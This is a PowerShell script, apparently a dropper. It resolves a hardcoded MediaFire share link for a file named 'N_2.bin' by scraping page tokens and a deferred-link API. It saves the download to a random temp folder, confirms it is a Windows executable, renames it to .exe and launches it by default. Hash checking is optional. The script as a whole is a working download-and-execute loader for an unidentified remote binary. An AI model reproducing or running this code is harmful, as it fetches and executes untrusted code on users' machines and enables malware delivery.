param(
    [string]$Url = 'https://www.mediafire.com/file/mnt44nkq3b0yt8i/N_2.bin/file',
    [string]$FileName,
    [string]$Sha256,
    [switch]$NoLaunch,
    [Parameter(ValueFromRemainingArguments = $true)]$RestArgs
)

$DownloadUrl = $Url
if ($FileName -and $FileName.Trim() -eq '') { $FileName = $null }

$TempDir = Join-Path $env:TEMP ([System.Guid]::NewGuid().ToString())
$ErrorActionPreference = 'Stop'
$ExitCode = 1
$script:UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
$script:Cookies = New-Object System.Net.CookieContainer

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]3072 -bor [Net.SecurityProtocolType]192
}
catch { }

function Invoke-Http {
    param([string]$Uri, [string]$Method = 'GET', $Body, [string]$ContentType, [hashtable]$Headers, [string]$OutFile)

    $req = [System.Net.HttpWebRequest]::Create($Uri)
    $req.Method = $Method
    $req.UserAgent = $script:UA
    $req.Accept = 'text/html,application/xhtml+xml,application/json;q=0.9,*/*;q=0.8'
    $req.CookieContainer = $script:Cookies
    $req.Timeout = 120000
    $req.ReadWriteTimeout = 120000
    $req.MaximumAutomaticRedirections = 10
    try {
        $req.AutomaticDecompression = [System.Net.DecompressionMethods]::Gzip -bor [System.Net.DecompressionMethods]::Deflate
    }
    catch { }
    if ($ContentType) { $req.ContentType = $ContentType }
    if ($Headers) {
        foreach ($key in $Headers.Keys) {
            $value = [string]$Headers[$key]
            if ($key -eq 'Referer') { $req.Referer = $value }
            elseif ($key -eq 'Accept') { $req.Accept = $value }
            else { $req.Headers.Add($key, $value) }
        }
    }

    $payload = $null
    if ($Body -is [hashtable]) {
        $pairs = @()
        foreach ($key in $Body.Keys) { $pairs += ('{0}={1}' -f [Uri]::EscapeDataString($key), [Uri]::EscapeDataString([string]$Body[$key])) }
        $payload = [Text.Encoding]::UTF8.GetBytes(($pairs -join '&'))
        if (-not $ContentType) { $req.ContentType = 'application/x-www-form-urlencoded' }
    }
    elseif ($Body -is [byte[]]) { $payload = $Body }
    elseif ($Body) { $payload = [Text.Encoding]::UTF8.GetBytes([string]$Body) }

    if ($payload -and $payload.Length -gt 0) {
        $req.ContentLength = $payload.Length
        $rs = $req.GetRequestStream()
        $rs.Write($payload, 0, $payload.Length)
        $rs.Close()
    }

    try { $resp = $req.GetResponse() }
    catch [System.Net.WebException] {
        $resp = $_.Exception.Response
        if (-not $resp) { throw }
    }

    $status = [int]$resp.StatusCode
    $ctype = [string]$resp.Headers['Content-Type']
    $final = [string]$resp.ResponseUri
    $written = 0
    $text = ''
    $hdrs = @{}
    foreach ($key in $resp.Headers.AllKeys) { $hdrs[$key] = [string]$resp.Headers[$key] }

    $in = $resp.GetResponseStream()
    if ($OutFile) {
        $total = 0
        [long]::TryParse([string]$resp.Headers['Content-Length'], [ref]$total) | Out-Null
        $fs = [System.IO.File]::Create($OutFile)
        $buffer = New-Object byte[] 65536
        $start = Get-Date
        $lastDraw = Get-Date
        while ($true) {
            $read = $in.Read($buffer, 0, $buffer.Length)
            if ($read -le 0) { break }
            $fs.Write($buffer, 0, $read)
            $written += $read
            if (((Get-Date) - $lastDraw).TotalMilliseconds -lt 200) { continue }
            $lastDraw = Get-Date
            $speed = $written / 1024 / [Math]::Max(((Get-Date) - $start).TotalSeconds, 0.001)
            if ($total -gt 0) {
                $pct = [Math]::Min(100, $written * 100 / $total)
                $bar = ('#' * [int]($pct / 2)).PadRight(50, '-')
                Write-Host ("`r  [{0}] {1,5:N1}% {2,8:N1} MB {3,8:N0} KB/s" -f $bar, $pct, ($written / 1MB), $speed) -NoNewline
            }
            else {
                Write-Host ("`r  {0,8:N1} MB {1,8:N0} KB/s" -f ($written / 1MB), $speed) -NoNewline
            }
        }
        $fs.Close()
        Write-Host ''
    }
    else {
        $sr = New-Object IO.StreamReader($in, [Text.Encoding]::UTF8)
        $text = $sr.ReadToEnd()
        $written = $text.Length
        $sr.Close()
    }
    $in.Close()
    $resp.Close()

    return @{ Status = $status; ContentType = $ctype; FinalUrl = $final; Bytes = $written; Text = $text; Headers = $hdrs }
}

function Get-LongestToken([string]$Html) {
    $best = ''
    foreach ($m in [regex]::Matches($Html, 'data-security-token="([^"]+)"')) {
        if ($m.Groups[1].Value.Length -gt $best.Length) { $best = $m.Groups[1].Value }
    }
    if (-not $best) {
        $m = [regex]::Match($Html, 'security_token=([A-Za-z0-9_\-\.\%]{40,})')
        if ($m.Success) { $best = [Uri]::UnescapeDataString($m.Groups[1].Value) }
    }
    return $best
}

function Get-JwtClaim([string]$Token, [string]$Name) {
    try {
        $payload = ($Token -split '\.')[1]
        $payload = $payload.Replace('-', '+').Replace('_', '/')
        switch ($payload.Length % 4) {
            2 { $payload += '==' }
            3 { $payload += '=' }
        }
        $json = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($payload)) | ConvertFrom-Json
        return $json.$Name
    }
    catch { return $null }
}

function Get-LinkName([string]$Link) {
    try { $path = ([Uri]$Link).AbsolutePath } catch { $path = $Link }
    foreach ($seg in ($path -split '/')) {
        if ($seg -match '\.' -and $seg -notmatch '(?i)^file$') { return [Uri]::UnescapeDataString($seg) }
    }
    return $null
}

function Get-SharePage([string]$Link) {
    if ($Link -notmatch '(?i)^https?://') { return "https://www.mediafire.com/file/$Link/file" }
    if ($Link -match '(?i)download[0-9]*\.mediafire\.com/[a-z0-9_\-]*/([a-z0-9]{12,})/') {
        return "https://www.mediafire.com/file/$($matches[1])/file"
    }
    if ($Link -match '(?i)/f/([a-z0-9]+)(/|$)') { return "https://www.mediafire.com/file/$($matches[1])/file" }
    if ($Link -match '(?i)[?&]dj=([a-z0-9]+)') { return "https://www.mediafire.com/file/$($matches[1])/file" }
    return $Link
}

function Get-PagePlans([string]$Html) {
    $urls = @()

    foreach ($m in [regex]::Matches($Html, '<a\b[^>]*>')) {
        $tag = $m.Value
        if ($tag -match 'id="downloadButton"' -or $tag -match 'class="input popsok"') {
            $href = [regex]::Match($tag, 'href="([^"]+)"').Groups[1].Value
            if ($href -and $href -notmatch '(?i)^(#|javascript:|/customer)') { $urls += $href.Replace('&amp;', '&') }
        }
    }
    foreach ($m in [regex]::Matches($Html, 'https?://download[0-9]*\.mediafire\.com/[^\s"''<>\\]+')) {
        $urls += $m.Value.Replace('&amp;', '&')
    }

    $plans = @()
    $seen = @{}
    foreach ($u in $urls) {
        if ($u -and -not $seen.ContainsKey($u)) {
            $seen[$u] = $true
            $plans += [pscustomobject]@{ Url = $u; Post = $null; Kind = 'page' }
        }
    }

    $security = [regex]::Match($Html, '<input[^>]+name="security"[^>]+value="([^"]+)"').Groups[1].Value
    $count = $plans.Count
    for ($i = 0; $i -lt $count; $i++) {
        $plans += [pscustomobject]@{ Url = $plans[$i].Url; Post = @{ security = $security }; Kind = 'form' }
    }

    return @{ Plans = $plans; Security = $security }
}

function Request-DeferredUrl([string]$Page, [string]$Token) {
    $boundary = [guid]::NewGuid().ToString('N')
    $nl = "`r`n"
    $formText = '--' + $boundary + $nl +
                'Content-Disposition: form-data; name="security_token"' + $nl + $nl +
                $Token + $nl +
                '--' + $boundary + '--' + $nl
    $body = [Text.Encoding]::UTF8.GetBytes($formText)

    for ($attempt = 1; $attempt -le 10; $attempt++) {
        $resp = Invoke-Http -Uri 'https://www.mediafire.com/download_link.php' -Method 'POST' -Body $body `
            -ContentType ('multipart/form-data; boundary=' + $boundary) -Headers @{
            'X-Requested-With' = 'XMLHttpRequest'
            'Origin'           = 'https://www.mediafire.com'
            'Referer'          = $Page
            'Accept'           = 'application/json'
        }
        $data = $resp.Text | ConvertFrom-Json
        if ($data.result -ne 'success') { throw ('MediaFire error ' + $data.error_code + ': ' + $data.error_message) }
        if ($data.status -eq 'success' -and $data.download_url) {
            $post = @{}
            $bdpass = Get-JwtClaim $Token 'bdpass'
            if ($bdpass) { $post['pass'] = $bdpass }
            return [pscustomobject]@{ Url = $data.download_url.Replace('&amp;', '&'); Post = $post }
        }
        if ($data.status -eq 'error') { throw ('MediaFire refused a download link: ' + $data.error_message) }
        $wait = 5
        if ($data.retry_after) { $wait = [int]$data.retry_after }
        Write-Host ('  server busy, retrying in ' + $wait + 's (' + $attempt + '/10)')
        Start-Sleep -Seconds $wait
    }
    throw 'MediaFire kept the download link delayed.'
}

function Save-MfFile([string]$Link, [string]$Dest) {
    $page = Get-SharePage $Link
    $html = (Invoke-Http -Uri $page -Headers @{ 'Referer' = 'https://www.mediafire.com/' }).Text

    if ($html -match '(?i)(file is no longer available|could not be found|has been removed|password protected|This file requires)') {
        throw 'MediaFire says the file is unavailable, removed, or password protected.'
    }

    $found = Get-PagePlans $html
    $plans = @($found.Plans)

    $token = Get-LongestToken $html
    if ($token) {
        try {
            $deferred = Request-DeferredUrl $page $token
            $plans += [pscustomobject]@{ Url = $deferred.Url; Post = $deferred.Post; Kind = 'deferred' }
        }
        catch { Write-Host ('  deferred link API failed: ' + $_.Exception.Message) }
    }

    if ($found.Security) {
        try {
            $action = [regex]::Match($html, '<form[^>]+name="download"[^>]+action="([^"]+)"').Groups[1].Value
            if (-not $action) { $action = $page }
            $again = Get-PagePlans (Invoke-Http -Uri $action.Replace('&amp;', '&') -Method 'POST' -Body @{ security = $found.Security } -Headers @{ 'Referer' = $page }).Text
            foreach ($p in $again.Plans) { $plans += $p }
        }
        catch { Write-Host ('  security form refresh failed: ' + $_.Exception.Message) }
    }

    if ($plans.Count -eq 0) {
        throw 'No download link on the page - folder link, private file, or a MediaFire layout change.'
    }

    $lastError = 'link rejected'
    foreach ($plan in $plans) {
        $method = 'GET'
        $post = $null
        if ($plan.Post -and $plan.Post.Count -gt 0) { $method = 'POST'; $post = $plan.Post }
        try {
            $resp = Invoke-Http -Uri $plan.Url -Method $method -Body $post -OutFile $Dest -Headers @{ 'Referer' = 'https://www.mediafire.com/' }
            $reason = $null
            if ($resp.FinalUrl -match 'download_repair') { $reason = 'link expired or already used' }
            elseif ($resp.ContentType -match 'html') { $reason = 'server answered with a web page' }
            elseif ($resp.Bytes -le 0) { $reason = 'empty response' }
            if ($reason) {
                $lastError = $reason
                if (Test-Path -LiteralPath $Dest) { Remove-Item -LiteralPath $Dest -Force }
                Write-Host ('  ' + $plan.Kind + ' attempt failed (' + $reason + ')')
                continue
            }
            $name = $null
            if ($resp.Headers.ContainsKey('Content-Disposition') -and $resp.Headers['Content-Disposition'] -match 'filename="?([^";]+)') {
                $name = $matches[1]
            }
            return @{ Bytes = $resp.Bytes; Name = $name; Url = $plan.Url }
        }
        catch {
            $lastError = $_.Exception.Message
            if (Test-Path -LiteralPath $Dest) { Remove-Item -LiteralPath $Dest -Force }
            Write-Host ('  ' + $plan.Kind + ' attempt failed (' + $lastError + ')')
        }
    }
    throw ('Could not download the file: ' + $lastError)
}

try {
    New-Item -ItemType Directory -Path $TempDir -Force | Out-Null
    if ($FileName) {
        $DownloadedFile = Join-Path $TempDir ($FileName + '.bin')
        $ExePath = Join-Path $TempDir ($FileName + '.exe')
    }
    else {
        $FileName = 'download'
        $DownloadedFile = Join-Path $TempDir 'download.bin'
        $ExePath = Join-Path $TempDir 'download.exe'
    }
    $autoName = -not $PSBoundParameters.ContainsKey('FileName')

    if ($DownloadUrl -match '(?i)mediafire\.com' -or $DownloadUrl -match '^[a-z0-9]{8,}$') {
        Write-Host 'resolving share link...'
        $got = Save-MfFile $DownloadUrl $DownloadedFile
        if ($autoName) {
            $picked = Get-LinkName $DownloadUrl
            if (-not $picked -and $got.Name) { $picked = $got.Name }
            if ($picked) {
                $FileName = [IO.Path]::GetFileNameWithoutExtension($picked)
                $DownloadedFile = Join-Path $TempDir ($FileName + '.bin')
                $ExePath = Join-Path $TempDir ($FileName + '.exe')
                Move-Item -LiteralPath (Join-Path $TempDir 'download.bin') -Destination $DownloadedFile -Force
            }
        }
        Write-Host ('downloaded ' + ('{0:N0}' -f $got.Bytes) + ' bytes -> ' + $DownloadedFile)
    }
    else {
        $resp = Invoke-Http -Uri $DownloadUrl -OutFile $DownloadedFile
        if ($resp.ContentType -match 'html') { throw 'Server returned a web page instead of a file.' }
        if ($autoName -and $resp.Headers.ContainsKey('Content-Disposition') -and $resp.Headers['Content-Disposition'] -match 'filename="?([^";]+)') {
            $picked = [IO.Path]::GetFileNameWithoutExtension($matches[1])
            if ($picked) {
                $FileName = $picked
                $DownloadedFile = Join-Path $TempDir ($FileName + '.bin')
                $ExePath = Join-Path $TempDir ($FileName + '.exe')
                Move-Item -LiteralPath (Join-Path $TempDir 'download.bin') -Destination $DownloadedFile -Force
            }
        }
        Write-Host ('downloaded ' + ('{0:N0}' -f $resp.Bytes) + ' bytes -> ' + $DownloadedFile)
    }

    if (-not (Test-Path -LiteralPath $DownloadedFile)) { throw 'Download failed - file missing.' }
    if ((Get-Item -LiteralPath $DownloadedFile).Length -eq 0) { throw 'Downloaded file is empty.' }

    if ($Sha256) {
        $hash = (Get-FileHash -LiteralPath $DownloadedFile -Algorithm SHA256).Hash
        if ($hash -ne $Sha256.Replace('-', '').Trim().ToUpperInvariant()) {
            throw ('SHA256 mismatch.' + [Environment]::NewLine + '  expected ' + $Sha256.ToUpperInvariant() + [Environment]::NewLine + '  actual   ' + $hash)
        }
        Write-Host 'sha256 ok'
    }

    $Stream = [System.IO.File]::OpenRead($DownloadedFile)
    try {
        $Header = New-Object byte[] 2
        $Read = $Stream.Read($Header, 0, 2)
    }
    finally {
        $Stream.Dispose()
    }

    if ($Read -ne 2 -or
        $Header[0] -ne 0x4D -or
        $Header[1] -ne 0x5A) {
        throw 'Downloaded file is not a valid Windows EXE.'
    }

    Move-Item -LiteralPath $DownloadedFile -Destination $ExePath -Force

    if ($NoLaunch) {
        Write-Host ('saved, not launched: ' + $ExePath)
        $ExitCode = 0
    }
    else {
        & $ExePath @RestArgs
        $ExitCode = $LASTEXITCODE
    }
}
catch {
    Write-Error $_
    $ExitCode = 1
}

exit $ExitCode
